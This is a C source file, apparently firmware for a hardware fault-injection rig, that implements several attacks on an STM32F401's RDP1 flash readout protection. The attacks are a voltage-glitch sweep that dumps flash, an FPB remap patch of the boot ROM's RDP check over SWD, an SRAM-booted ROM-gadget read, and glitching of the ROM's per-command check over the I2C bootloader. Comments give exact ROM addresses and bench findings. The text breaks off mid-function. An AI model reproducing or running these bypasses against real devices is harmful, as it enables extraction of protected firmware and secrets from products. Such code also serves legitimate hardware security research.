                            attempt, ok ? cid[3] : 0, ok ? cid[2] : 0, ok ? cid[1] : 0, ok ? cid[0] : 0,
                            got, nonff);
            if (nonff > 0) {
                success = true;
                uart_cli_send("=== SHADOW BYPASS — FLASH DUMP ===");
                for (uint32_t i = 0; i < got; i++) {
                    if (i % 16 == 0) uart_cli_printf("\r\n0x%08lX:", 0x08000000UL + i);
                    uart_cli_printf(" %02X", db[i]);
                }
                uart_cli_send("\r\n");
            }
        }

        if (attempt % 50 == 0)
            uart_cli_printf("  [%lu/%lu] off=%luus w=%luus effects=%lu reup=%lu\r\n",
                            attempt, max_attempts, off, width, effects, reuploads);

        // Advance sweep: width inner, offset outer.
        wi++;
        if (wi >= NW) { wi = 0; off += OFF_STEP; if (off > OFF_MAX) off = OFF_MIN; }
    }

    if (!success)
        uart_cli_printf("\r\nSHADOW sweep done: %lu attempts, %lu header-effects, no readable flash.\r\n",
                        attempt, effects);
    else
        uart_cli_send("\r\n*** SHADOW GLITCH SUCCESS — flash read at RDP1 ***\r\n");

    gpio_put(BOOT0_PIN, 0); gpio_put(BOOT1_PIN, 0);
    gpio_set_mask(POWER_MASK);
}

// RDP1 ROM-FPB probe: patch the boot ROM's software RDP check IN PLACE via FPB
// remap, then read flash through the ROM's own I2C bootloader. No glitching.
//
// Rationale (bench-proven constraints this builds on):
// - SRAM-executed flash reads fault at RDP1 (LEAKPROBE) => SRAM stage-2 is dead.
// - SWD cannot read OR execute the boot ROM at RDP1 (ROMREAD finding) => debugger
//   PC-redirect into ROM is dead. But a *genuine* bootloader boot executes ROM:
//   BOOT0=1 reset runs the ROM dispatcher poll, a live ROM-executing core.
// - The ROM's RDP gate is ONE software function at 0x1FFF0B94 (reads
//   FLASH_OPTCR & 0xFF00 == 0xAA00). Every gated command (Read 0x11, Write 0x31,
//   Erase 0x44/0x45, RP/RU/Go) calls it via the wrapper at 0x1FFF06E4, which
//   sets r0=0 BEFORE its tail-call — so if the checker returns instantly
//   (bx lr as its first instruction), r0 is already 0 = "unprotected" for ALL
//   gated commands at once.
// - FPB remap is proven working on this bench (BYPASS chains): FP_REMAP points
//   at a table in code-region memory; a comparator hit fetches the replacement
//   halfword from the table instead of the real instruction. FPB covers the
//   whole code region (0x00000000-0x1FFFFFFF), which includes system memory
//   0x1FFF0000 — whether it actually patches ROM fetches is the open question
//   this command answers empirically.
//
// Sequence (two-gate model): gate 1 = debugger-connected blocks flash reads;
// gate 2 = execution-origin (ROM-executing reads are trusted, SRAM ones fault).
//  1. POR-boot into the ROM bootloader (BOOT0=1), attach SWD to the RUNNING
//     core (ROMFPBCTL proved halting it kills its I2C even pre-detection).
//  2. Program the FPB remap via AHB-AP with the core running: remap table in
//     SRAM (0x20001000, clear of ROM globals/RX buffer), COMP0 on 0x1FFF0B94,
//     stub 0x4770 (bx lr) - the wrapper pre-sets r0=0, so an instant return
//     reads "unprotected" for ALL gated commands at once.
//  3. Brownout dip (POWER pins sink, ADC-gated, calibrated depth below BOR
//     ~2.22V): debug domain dies (nRST does not clear it - bench-proven),
//     SRAM survives per the retention sweep (256/256 at all depths). The
//     bootloader reboots with no debugger ever attached.
//  4. I2C: GV (control) -> PROBE 0x11 -> READ 0x08000000 (DEADBEEF
//     known-plaintext).
//
// Outcomes (bench result, 2026-09-30):
//   - Bench result: GV ACKs after BOR (bootloader survives, RP-status 0xFF 0xFF
//     = RDP still active) but gated commands still NACK, and the post-mortem
//     FPB readback shows COMP0=0 / REMAP=default / CTRL enable-bit cleared:
//     the brownout resets the FPB along with the debug domain. Trilemma closed:
//       patch+attached   -> gate 1 blocks the read (debugger in debug domain)
//       patch+detached   -> BOR wipes FPB with the debug domain
//       no-patch+detached -> checker un-patched, commands gated
//     => FPB-remap path ruled out for RDP1 bypass on this F401. Gate 2
//     (execution-origin) remains reachable only via glitching (BYPASS family).
void target_power_romfpb(void) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern bool swd_is_connected(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern void i2c_bl_enter(void);
    extern bool i2c_bl_gv(uint8_t addr7);
    extern bool i2c_bl_read(uint8_t addr7, uint32_t address, uint32_t len);
    extern bool i2c_bl_probe(uint8_t addr7, uint8_t cmd);
    extern void i2c_pins_reinit(void);
    extern bool swd_clear_errors(void);

    // F401 boot-ROM RDP check: ldr r1,=FLASH_OPTCR; ldr; and #0xFF00; cmp #0xAA00...
    // First instruction at 0x1FFF0B94 is `ldr r1,[pc,#168]` (0x492A). The wrapper
    // 0x1FFF06E4 pre-sets r0=0, so returning here yields "unprotected".
    const uint32_t ROM_RDP_CHECK = 0x1FFF0B94u;
    // bx lr = 0x4770, written to BOTH halfwords of remap word 0 (REPLACE-agnostic).
    const uint32_t REMAP_STUB = 0x47704770u;
    // SRAM remap table: clear of ROM globals 0x2000080C/0x20001A24, RX buffer at
    // 0x20000814+, and far below the SRAM-top stack. 8-word aligned.
    const uint32_t REMAP_TABLE = 0x20001000u;

    uart_cli_send("ROMFPB: FPB-patch ROM RDP check 0x1FFF0B94 -> bx lr, read via I2C bl\r\n");

    // === Step 1: boot into the ROM bootloader, attach DURING early boot ===
    // Bench-proven constraints shaping this sequence:
    //  (a) halting the bootloader — live OR early — corrupts its I2C slave
    //      state; ROMFPBCTL proved even a pre-detection halt+resume leaves it
    //      dead (GV stuck). So the patch must be applied WITHOUT halting.
    //  (b) FPB config does NOT survive a free POR reboot on this F401 — the
    //      patch must be applied while running, with no reset afterwards.
    // => connect SWD during the first ~60 ms after POR (boot0=1), then program
    //    FP_COMP0/FP_REMAP + the SRAM table via AHB-AP while the core RUNS —
    //    exactly how live breakpoints work. The RDP checker is only invoked
    //    when a gated command arrives, so mid-boot patching is in-window.
    uart_cli_send("[1] POR boot + early SWD attach (no halt)...\r\n");
    target_power_ensure_on();
    swd_init();
    if (!swd_connect() || !swd_clear_errors()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed before bootloader entry\r\n");
        return;
    }
    // POR with BOOT0=1 (enter()'s was_swd path), then attach IMMEDIATELY —
    // manual i2c_bl_enter() inlined so we can connect in the 60ms boot window.
    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 0);
    i2c_pins_reinit();              // GP4/5 -> bit-bang I2C (idle high)
    target_power_cycle(150);
    swd_init();
    // DP needs a moment to come up after the rail returns; retry connect for a
    // bounded ~80ms — well within the boot window before I2C detection arms.
    bool connected = false;
    for (int i = 0; i < 20 && !connected; i++) {
        connected = swd_connect() && swd_clear_errors();
        if (!connected) sleep_ms(4);
    }
    if (!connected) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed during boot window\r\n");
        return;
    }

    // === Step 2: FPB remap setup (proven BYPASS encoding), core running ===
    uart_cli_send("[2] Configuring FPB remap (no halt — AHB-AP while core runs)...\r\n");
    uint32_t remap_val = REMAP_STUB;
    if (swd_write_mem(REMAP_TABLE, &remap_val, 1) != 1) {
        swd_deinit();
        uart_cli_send("ERROR: Failed to write remap table\r\n");
        return;
    }
    // FP_CTRL = KEY|ENABLE
    uint32_t fp_ctrl = 0x03;
    swd_write_mem(FP_CTRL, &fp_ctrl, 1);
    // FP_REMAP -> table (bits[28:2] hold the address; raw word works as in BYPASS)
    uint32_t fp_remap = REMAP_TABLE;
    swd_write_mem(FP_REMAP, &fp_remap, 1);
    // FP_COMP0: match 0x1FFF0B94, ENABLE, REPLACE=00 (remap mode ignores REPLACE)
    uint32_t fp_comp0 = (ROM_RDP_CHECK & 0x1FFFFFFCu) | 1u;
    swd_write_mem(FP_COMP0, &fp_comp0, 1);

    // Verify FPB config
    uint32_t verify_val;
    swd_read_mem(FP_CTRL, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", (unsigned long)verify_val);
    swd_read_mem(FP_REMAP, &verify_val, 1);
    uart_cli_printf("    FP_REMAP: 0x%08lX\r\n", (unsigned long)verify_val);
    swd_read_mem(FP_COMP0, &verify_val, 1);
    uart_cli_printf("    FP_COMP0: 0x%08lX (match 0x%08lX)\r\n",
                    (unsigned long)verify_val, (unsigned long)ROM_RDP_CHECK);
    swd_read_mem(REMAP_TABLE, &verify_val, 1);
    uart_cli_printf("    Remap[0]: 0x%08lX (bx lr stub)\r\n", (unsigned long)verify_val);

    // === Step 3: exercise I2C with the patch live, debugger idle-attached ===
    // Brownout detour result (2026-09-30): the debug domain does NOT gate the
    // I2C path - after a BOR relaunch with no debugger at all, gated commands
    // still NACK (RP-status 0xFF 0xFF). The gate is purely the software RDP
    // check, so the patch must simply be live when the checker runs. FPB dies
    // with BOR, so no reset may follow the patch - and halting is forbidden
    // (ROMFPBCTL: even an early halt kills the bootloader's I2C). Hence: patch
    // via AHB-AP with the core running (done in step 2), then talk immediately.
    // Known bench quirk: the FIRST I2C exchange after a POR can fail while
    // later ones succeed (constraint c), so EVERY exchange gets retries.
    uart_cli_send("[3] I2C GV (control, un-gated; retrying for first-exchange quirk)...\r\n");
    bool gv_ok = false;
    for (int i = 0; i < 3 && !gv_ok; i++) {
        gv_ok = i2c_bl_gv(0x39);
        if (!gv_ok) sleep_ms(50);
    }

    uart_cli_send("[4] I2C PROBE 0x11 (gated; pre-patch baseline was NACK)...\r\n");
    bool probe_ok = false;
    for (int i = 0; i < 3 && !probe_ok; i++) {
        probe_ok = i2c_bl_probe(0x39, 0x11);
        if (!probe_ok) sleep_ms(50);
    }

    uart_cli_send("[5] I2C READ 0x08000000 64 (decisive - DEADBEEF known-plaintext)...\r\n");
    bool read_ok = false;
    for (int i = 0; i < 3 && !read_ok; i++) {
        read_ok = i2c_bl_read(0x39, 0x08000000, 64);
        if (!read_ok) sleep_ms(50);
    }

    swd_deinit();

    if (read_ok) {
        uart_cli_send("ROMFPB: *** SUCCESS *** flash read at RDP1 with the checker patched.\r\n");
        uart_cli_send("=> FPB DOES remap system-memory fetches; the I2C path is gated\r\n");
        uart_cli_send("   only by the software check (debugger attachment irrelevant).\r\n");
        return;
    }
    if (gv_ok && probe_ok) {
        uart_cli_send("ROMFPB: PROBE un-gated but READ failed => partial un-gate; re-read.\r\n");
        return;
    }
    if (gv_ok) {
        uart_cli_send("ROMFPB: bootloader alive (GV ok) but gated commands still NACK.\r\n");
        uart_cli_send("=> FPB does not remap system-memory (0x1FFF....) fetches on this\r\n");
        uart_cli_send("   part - comparator hits are ignored outside flash. Ruled out.\r\n");
    } else {
        uart_cli_send("ROMFPB: bootloader not ACKing - check whether the FPB remap of a\r\n");
        uart_cli_send("   live-fetched ROM instruction crashed the boot (watch PC via SWD).\r\n");
    }
}

// ROM-gadget premise test (stage2 = trampoline into the boot-ROM read loop).
// Premise: gate 2 is execution-origin — flash reads are permitted when the PC
// is in ROM (a genuine bootloader boot executes the ROM read path), but not
// from SRAM (LEAKPROBE proved SRAM-origin reads fault). So don't talk to the
// bootloader at all: SRAM-boot a tiny stage2 that redirects the ROM transmit
// helper's register-block pointer (RAM global [0x200006C4]) to a fake block in
// SRAM, sets r5=0x08000000 / r6=1, and jumps into the ROM read loop
// (0x1fff0550). The helper's "transmit" (strh r4,[block+0x10]) then parks the
// flash byte at 0x20003010. SWD re-attach recovers it.
//
// Sequence:
//  1. SWD: upload stage2 (96 bytes @ 0x20002000) + poison 0x20003000..3FFF,
//     then set BOOT0=1/BOOT1=1 (SRAM boot mode).
//  2. Brownout dip (ADC-gated, fixed ~1.2V): debug domain dies, SRAM survives
//     (retention sweep: 256/256), chip SRAM-boots stage2 debugger-free.
//  3. stage2 runs -> ROM gadget reads 0x08000000, parks byte at 0x20003010.
//  4. SWD re-attach: read markers 0x20003018 (fault flag) / 0x2000301C
//     ("GOK2" stage2-ran) and the parked byte; expect 0xEF (DEADBEEF, LE).
// wrappers: ROMGADGET [N | 0xADDR]
static void romgadget_run(uint32_t force_variant, uint32_t probe_addr);
void target_power_romgadget_variant(uint32_t v) { romgadget_run(v, 0x1FFF0551u); }
void target_power_romgadget_addr(uint32_t addr) { romgadget_run(4, addr); }
void target_power_romgadget(void) { romgadget_run(UINT32_MAX, 0x1FFF0551u); }

static void romgadget_run(uint32_t force_variant, uint32_t probe_addr) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern bool swd_clear_errors(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_read_core_reg(uint8_t reg, uint32_t *val);

    static uint32_t romgadget_variant = 0;   // persists across runs (auto mode)
    static uint32_t romgadget_probe = 0x1FFF0551u;
    if (force_variant != UINT32_MAX) {
        romgadget_variant = force_variant;
        if (force_variant == 4) romgadget_probe = probe_addr;
    }
    if (romgadget_variant == 4) romgadget_probe = probe_addr;
    uart_cli_printf("ROMGADGET variant %lu: ", (unsigned long)romgadget_variant);
    switch (romgadget_variant) {
    case 0: uart_cli_send("control (ROM loop, SRAM source)\r\n"); break;
    case 1: uart_cli_send("flash-plain (ROM loop, r5=0x08000000)\r\n"); break;
    case 2: uart_cli_send("flash-unlock (KEYR first, then flash loop)\r\n"); break;
    case 3: uart_cli_send("reader-trick (stage2 programs FPB)\r\n"); break;
    case 4: uart_cli_printf("fetch-probe blx 0x%08lX\r\n", (unsigned long)romgadget_probe); break;
    case 5: uart_cli_send("data-read (flash+ROM data loads from stage2)\r\n"); break;
    default:
        uart_cli_printf("ERROR: Unknown ROMGADGET variant '%lu' (0=control 1=flash 2=flash+unlock 3=reader 4=fetch-probe 5=data-read)\r\n",
                        (unsigned long)romgadget_variant);
        return;
    }

    // === Step 1: upload stage2 + poison the fake-block page, SRAM boot mode ===
    uart_cli_send("[1] SWD upload stage2 (0x20002000) + poison 0x20003000 page...\r\n");
    target_power_ensure_on();
    swd_init();
    if (!swd_connect() || !swd_clear_errors()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    if (!swd_halt()) {
        swd_deinit();
        uart_cli_send("ERROR: halt failed\r\n");
        return;
    }
    // upload in 32-bit words (payload is word-aligned; vectors live inside the
    // image, host copies words 0-3 to the SRAM-boot alias base below)
    if (swd_write_mem(0x20002000u, (const uint32_t *)f4_rom_gadget_payload,
                      f4_rom_gadget_payload_len / 4) != f4_rom_gadget_payload_len / 4) {
        swd_deinit();
        uart_cli_send("ERROR: stage2 upload failed\r\n");
        return;
    }
    uint32_t poison[16];
    for (int i = 0; i < 16; i++) poison[i] = 0x5015E01Eu;   // "POISONED" marker
    if (swd_write_mem(0x20003000u, poison, 16) != 16) {
        swd_deinit();
        uart_cli_send("ERROR: poison write failed\r\n");
        return;
    }
    // variant slot (outside the poison page) + probe target / result pre-fill:
    // variant 4 uses 0x200030F4 as the blx target; unchanged 0x1BADB002 = no result
    uint32_t variant_words[2] = { romgadget_variant,
                                  romgadget_variant == 4 ? romgadget_probe : 0x1BADB002u };
    if (swd_write_mem(0x200030F0u, variant_words, 2) != 2) {
        swd_deinit();
        uart_cli_send("ERROR: variant slot write failed\r\n");
        return;
    }
    // SRAM boot fetches the vector table from 0x20000000 (the alias base) -
    // copy stage2's own vector words there (MSP + reset + reserved + HardFault;
    // faults must land in stage2's marker, not a garbage vector — the
    // garbage-vector jump was this experiment's first ambiguity).
    uint32_t bootvec[4];
    swd_read_mem(0x20002000u, bootvec, 4);
    if (swd_write_mem(0x20000000u, bootvec, 4) != 4) {
        swd_deinit();
        uart_cli_send("ERROR: boot vector write failed\r\n");
        return;
    }
    // verify the uploads round-tripped
    uint32_t vchk = 0;
    swd_read_mem(0x20002004u, &vchk, 1);   // stage2 reset vector word
    uart_cli_printf("    stage2 reset vector: 0x%08lX\r\n", (unsigned long)vchk);
    swd_read_mem(0x20000004u, &vchk, 1);   // planted boot vector
    uart_cli_printf("    boot vector (0x20000004): 0x%08lX\r\n", (unsigned long)vchk);

    // BOOT0=1/BOOT1=1 -> SRAM boot mode (alias 0x20002000 visible at 0x00002000;
    // vector table there must be at 0x20002000)
    gpio_init(PIN_BOOT0); gpio_set_dir(PIN_BOOT0, GPIO_OUT); gpio_put(PIN_BOOT0, 1);
    gpio_init(PIN_BOOT1); gpio_set_dir(PIN_BOOT1, GPIO_OUT); gpio_put(PIN_BOOT1, 1);
    swd_deinit();

    // === Step 2: brownout dip - debug domain dies, SRAM (stage2) survives ===
    uart_cli_send("[2] Brownout dip (fixed ~1.2V, debug domain dies, SRAM survives)...\r\n");
    if (power_group_glitch_blocked()) return;
    gpio_init(SWD_NRST_PIN); gpio_set_dir(SWD_NRST_PIN, GPIO_IN); gpio_pull_up(SWD_NRST_PIN);
    adc_power_init();
    uint32_t thresh = (uint32_t)(1.2f / 3.3f * 4095.0f);
    gpio_set_dir(POWER_PIN2, GPIO_IN);  gpio_set_dir(POWER_PIN3, GPIO_IN);
    gpio_disable_pulls(POWER_PIN2);     gpio_disable_pulls(POWER_PIN3);
    uint64_t t0 = time_us_64();
    gpio_clr_mask(1u << POWER_PIN1);
    uint16_t vmin_raw = 4095;
    while (true) {
        uint16_t val = adc_read();
        if (val < vmin_raw) vmin_raw = val;
        if (val <= thresh) break;
        if (time_us_64() - t0 > 500000) break;
    }
    sleep_us(50);                        // debug-domain POR latch dwell
    gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    uint32_t dip_us = (uint32_t)(time_us_64() - t0);
    uart_cli_printf("    dipped to %.2fV in %luus\r\n",
                    vmin_raw * 3.3f / 4095.0f, (unsigned long)dip_us);

    bool nrst_went_low = false;
    for (int i = 0; i < 5000; i++) {
        if (!gpio_get(SWD_NRST_PIN)) { nrst_went_low = true; break; }
        sleep_us(10);
    }
    uart_cli_printf("    BOR: nRST %s\r\n", nrst_went_low ? "went LOW" : "stayed high");
    sleep_ms(30);                        // stage2 is ~30 cycles; plenty.

    // === Step 3: SWD recovery - read markers + parked byte ===
    uart_cli_send("[3] SWD re-attach: read markers + parked byte...\r\n");
    swd_init();
    bool reattached = false;
    for (int i = 0; i < 10 && !reattached; i++) {
        reattached = swd_connect() && swd_clear_errors();
        if (!reattached) sleep_ms(4);
    }
    if (!reattached) {
        swd_deinit();
        uart_cli_send("ERROR: SWD re-attach failed after dip\r\n");
        return;
    }
    uint32_t fault_mark = 0, ran_mark = 0, dr = 0, pc = 0, result = 0, fpc = 0, flr = 0;
    swd_read_mem(0x20003018u, &fault_mark, 1);
    swd_read_mem(0x2000301Cu, &ran_mark, 1);
    swd_read_mem(0x20003010u, &dr, 1);
    swd_read_mem(0x20003020u, &result, 1);
    swd_read_mem(0x20003024u, &fpc, 1);
    swd_read_mem(0x20003028u, &flr, 1);
    if (!swd_halt()) {
        uart_cli_send("    (halt failed - registers unavailable)\r\n");
    } else {
        uint32_t rr = 0;
        uart_cli_send("    regs: ");
        for (int reg = 0; reg <= 7; reg++) {
            swd_read_core_reg(reg, &rr);
            uart_cli_printf("r%u=0x%08lX ", reg, (unsigned long)rr);
        }
        uart_cli_send("\r\n");
        swd_read_core_reg(15, &pc);
        uart_cli_printf("    PC at halt: 0x%08lX (0x1fff0550 region = loop still running)\r\n",
                        (unsigned long)pc);
    }
    uart_cli_printf("    fault marker (0x20003018): 0x%08lX (0xFA17FA17 = HardFault)\r\n",
                    (unsigned long)fault_mark);
    uart_cli_printf("    faulted PC/LR (stacked): PC=0x%08lX LR=0x%08lX\r\n",
                    (unsigned long)fpc, (unsigned long)flr);
    uart_cli_printf("    stage2-ran  (0x2000301C): 0x%08lX (0x324F4B47 = \"GOK2\")\r\n",
                    (unsigned long)ran_mark);
    uart_cli_printf("    fake DR    (0x20003010): 0x%04lX (0xAA55 = helper never transmitted)\r\n",
                    (unsigned long)(dr & 0xFFFF));
    uart_cli_printf("    result     (0x20003020): 0x%08lX (0x1BADB002 = reader never stored)\r\n",
                    (unsigned long)result);
    uint32_t poison_residue = 0;
    swd_read_mem(0x20003000u, &poison_residue, 1);
    uart_cli_printf("    poison residue (0x20003000): 0x%08lX\r\n", (unsigned long)poison_residue);
    // fault forensics: CFSR/HFSR/BFAR tell fetch-vs-data and the faulting address
    bool faulted = (fault_mark == 0xFA17FA17u);
    if (faulted) {
        uint32_t cfsr = 0, hfsr = 0, bfar = 0;
        swd_read_mem(0xE000ED28u, &cfsr, 1);
        swd_read_mem(0xE000ED2Cu, &hfsr, 1);
        swd_read_mem(0xE000ED38u, &bfar, 1);
        uart_cli_printf("    CFSR=0x%08lX HFSR=0x%08lX BFAR=0x%08lX\r\n",
                        (unsigned long)cfsr, (unsigned long)hfsr, (unsigned long)bfar);
        // CFSR bytes: [7:0] MMFSR  [15:8] BFSR  [31:24] UFSR
        if (cfsr & 0x00010000u) uart_cli_send("      -> BFSR.IBUSERR: instruction bus error (fetch fault)\r\n");
        if (cfsr & 0x00020000u) uart_cli_send("      -> BFSR.PRECISERR: precise data bus error (BFAR valid)\r\n");
        if (cfsr & 0x00040000u) uart_cli_send("      -> BFSR.IMPRECISERR: imprecise data bus error\r\n");
        if (cfsr & 0x00000100u) uart_cli_printf("      -> BFSR.BFARVALID: BFAR=0x%08lX\r\n", (unsigned long)bfar);
        if (cfsr & 0x01000000u) uart_cli_send("      -> UFSR.INVSTATE: invalid state (bad EPSR/T-bit)\r\n");
        if (cfsr & 0x00000080u) uart_cli_send("      -> MMFSR.IACCVIOL: instruction access violation (XN/exec perm)\r\n");
    }
    swd_deinit();

    bool stage2_ran = (ran_mark == 0x324F4B47u);
    // strh writes only the low halfword -> poison (0x5015) stays in the upper
    // half of the word. Signatures are the low byte:
    //   0x1E = control variant read the poison byte  0xEF = flash[0] low byte
    bool got_flash = ((dr & 0xFFu) == 0xEFu) || (result == 0xDEADBEEFu);
    bool control_ok = ((dr & 0xFFu) == 0x1Eu);
    if (stage2_ran && got_flash) {
        uart_cli_send("ROMGADGET: *** FLASH READ *** flash byte captured in SRAM.\r\n");
        if (romgadget_variant < 3)
            uart_cli_printf("=> ROM-loop flash read WORKS from SRAM boot (variant %lu). Full dump path open.\r\n",
                            (unsigned long)romgadget_variant);
        else
            uart_cli_send("=> FPB reader-trick reads flash data with PC-origin flash. Premise CONFIRMED.\r\n");
    } else if (stage2_ran && control_ok) {
        uart_cli_printf("ROMGADGET: variant 0 control OK (DR low byte 0x1E = poison byte) - loop+transmit mechanics work.\r\n");
    } else if (stage2_ran && faulted) {
        uart_cli_printf("ROMGADGET: variant %lu HardFaulted - flash access blocked/faulted from this origin.\r\n",
                        (unsigned long)romgadget_variant);
    } else if (stage2_ran && (pc & ~1u) >= 0x1FFF0000u && (pc & ~1u) < 0x1FFF8000u) {
        uart_cli_printf("ROMGADGET: variant %lu STALLED in ROM loop (PC=0x%08lX, no fault) - flash data read blocked.\r\n",
                        (unsigned long)romgadget_variant, (unsigned long)pc);
    } else if (stage2_ran) {
        uart_cli_printf("ROMGADGET: variant %lu ran but produced no flash data (see markers/regs above).\r\n",
                        (unsigned long)romgadget_variant);
    } else if (faulted) {
        uart_cli_send("ROMGADGET: HardFault before the gadget - check stage2/ROM entry.\r\n");
    } else {
        uart_cli_send("ROMGADGET: no stage2 marker - SRAM boot or dip failed.\r\n");
    }

    if (force_variant == UINT32_MAX) {   // auto-advance mode only
        if (romgadget_variant == 4) {
            // sweep ROM in halfword steps; done after the last probe
            romgadget_probe += 2;
            if (romgadget_probe >= 0x1FFF77F1u) {
                uart_cli_send("ROMGADGET: fetch-probe sweep complete\r\n");
                romgadget_variant = 0;   // resume the read-loop variants
                romgadget_probe = 0x1FFF0551u;
            }
        } else {
            romgadget_variant = (romgadget_variant + 1) % 6;   // next run = next variant
        }
    }
}

// ============================================================================
// I2CGATE — glitch the boot ROM's per-command RDP check (0x1FFF0B94) during
// the I2C clock-stretch that follows a gated command byte.
//
// ROM mechanics (disasm, base 0x1FFF0000):
//   After the I2C command byte (e.g. 0x11 READ) is ACKed, the dispatch calls
//   rdp_locked() @0x1FFF0B94: live FLASH_OPTCR (0x40023C14) read, and.w r1,#0xFF00,
//   cmp r1,#0xAA00 -> return 1 = locked (caller then transmits 0x1F NACK).
//   The command byte's ACK is emitted BEFORE the check; the check runs while the
//   I2C slave clock-stretches SCL until the verdict is out.
//
// Attack window: between the command-byte ACK (SCL released, check about to run)
// and the NACK (0x1F). We fire the power glitch DURING the post-command stretch,
// corrupting the 0xAA00 comparison / OPTCR readback so the ROM proceeds as if
// RDP0. If it works, the subsequent address/length/data frames all ACK and the
// flash bytes come out over I2C — no debugger, normal ROM boot (gate 2 untouched).
//
// Per attempt:
//   1. send command byte frame (cmd, ~cmd) — command ACKs, check starts
//   2. immediately fire glitch (ADC-gated dip to vmin, WIDTH dwell, restore)
//   3. poll I2C for the verdict ACK (ACK = gate passed!) vs NACK (gated)
//   4. if ACK: send READ address frame (0x08000000) + length, dump data
//      if NACK: report and retry
// ============================================================================
// shared state for the mid-frame glitch hook (single-command lifetime)
static uint16_t i2cgate_thresh_raw;     // ADC counts (mv*4095/3300), NOT volts
static uint16_t i2cgate_vmin_raw;
static uint32_t i2cgate_dip_us;
static uint32_t i2cgate_dwell_us = 50;   // extra LOW dwell after threshold hit
static void i2cgate_dip_hook(void) {
    uint64_t t0 = time_us_64();
    gpio_set_dir(POWER_PIN2, GPIO_IN);  gpio_set_dir(POWER_PIN3, GPIO_IN);
    gpio_disable_pulls(POWER_PIN2);     gpio_disable_pulls(POWER_PIN3);
    gpio_clr_mask(1u << POWER_PIN1);
    while (true) {
        uint16_t val = adc_read();
        if (val < i2cgate_vmin_raw) i2cgate_vmin_raw = val;
        if (val <= i2cgate_thresh_raw) break;
        if ((uint32_t)(time_us_64() - t0) > 2000) break;  // 2ms safety cap
    }
    if (i2cgate_dwell_us) sleep_us(i2cgate_dwell_us);
    gpio_set_dir(POWER_PIN2, GPIO_OUT); gpio_set_dir(POWER_PIN3, GPIO_OUT);
    gpio_set_mask(POWER_MASK);
    i2cgate_dip_us = (uint32_t)(time_us_64() - t0);
}

// I2CGATE — glitch the boot ROM's per-command RDP check (0x1FFF0B94) while the
// gated command is being processed (the I2C clock-stretch after cmd ACK).
//
// Calibration design (RDP0/RDP1 discrimination):
//   At RDP0 a NACK means the glitch CORRUPTED the check (pass flipped to fail)
//   while uncorrupted shots ACK AND complete a full read (data path proven).
//   Timing is calibrated when RDP0 shows corruption-rate > 0. Then at RDP1 the
//   same timing is used: ACK = gate corrupted = flash dump follows.
//
// Windows per attempt (i % 3):
//   0 = dip fires after cmd byte ACK, before ~cmd (hook 1)
//   1 = dip fires after ~cmd byte, before STOP (hook 2) — rail sags exactly
//       when the frame ends and rdp_locked() runs
//   2 = dip fires after STOP (original post-frame timing, control)
void target_power_i2cgate(uint32_t attempts, uint32_t vmin_mv) {
    if (power_group_glitch_blocked()) return;
    if (attempts == 0) attempts = 1;
    if (attempts > 2000) attempts = 2000;
    // vmin_mv = 0 -> auto-sweep depth 1.30V down to 0.70V, 100mV steps
    float v_threshold = (vmin_mv ? vmin_mv : 1300) / 1000.0f;
    float v_min_depth = 0.70f;
    uint32_t depth_step = (vmin_mv ? 0 : 100);
    uint8_t a = I2C_BL_ADDR7_DEFAULT;

    uart_cli_printf("I2CGATE: glitch the ROM RDP check during command processing (%lu attempts)\r\n",
                    (unsigned long)attempts);
    uart_cli_printf("    dip depth: %s, windows: cmd-byte / pre-STOP / post-STOP (rotating)\r\n",
                    depth_step ? "auto-sweep 1.30V -> 0.70V (100mV steps)" : "fixed");

    // entry: power the target and boot it into the system bootloader over I2C.
    // Without this the target sits de-energized and every NACK is just
    // "device absent" — the bug that produced the fake 20/20 "HIT" run.
    target_power_ensure_on();
    i2c_bl_enter();
    sleep_ms(60);
    if (!i2c_bl_get(a)) {
        uart_cli_send("ERROR: I2CGATE: bootloader not responding (GET failed)\r\n");
        return;
    }

    // reads_blank_ff = ACK + all-0xFF: INCONCLUSIVE (blank/blocked/poison all look
    // alike) — NOT a proven data path (rdp-payload-check: "0xFF is NOT a pass").
    // reads_nonff   = ACK + real non-FF content: the only meaningful read — at RDP0
    // it proves the data path (must recover the known marker), at RDP1 it is a DUMP.
    // read_fail     = ACK but the read frames themselves failed.
    uint32_t ack_wins = 0, nack = 0, nack_nodip = 0, addr_fail = 0;
    uint32_t reads_blank_ff = 0, reads_nonff = 0, read_fail = 0;
    uint32_t reentries = 0;
    // warm-up: the FIRST command frame after a fresh entry+GET always NACKs
    // (cold slave) — fire an ungated 0x02 raw frame to settle it, else a
    // fresh-per-shot campaign dies on attempt 1 every time.
    i2c_bl_send_cmd_raw(a, 0x02);
    sleep_ms(5);
    for (uint32_t i = 0; i < attempts; i++) {
        // dip state per attempt
        i2cgate_dwell_us = 0;
        i2cgate_vmin_raw = 4095;
        i2cgate_dip_us = 0;
        i2cgate_thresh_raw = (uint16_t)((uint32_t)(v_threshold * 1000.0f) * 4095u / 3300u);
        adc_power_init();
        adc_select_input(ADC_POWER_CHAN);
        gpio_init(SWD_NRST_PIN); gpio_set_dir(SWD_NRST_PIN, GPIO_IN); gpio_pull_up(SWD_NRST_PIN);
        uint32_t win = i % 3;

        // fire the glitch in the selected window
        bool addr_ok = i2c_bl_cmd_with_hook(a, 0x11,
                                            win == 0 ? i2cgate_dip_hook : NULL,
                                            win == 1 ? i2cgate_dip_hook : NULL);
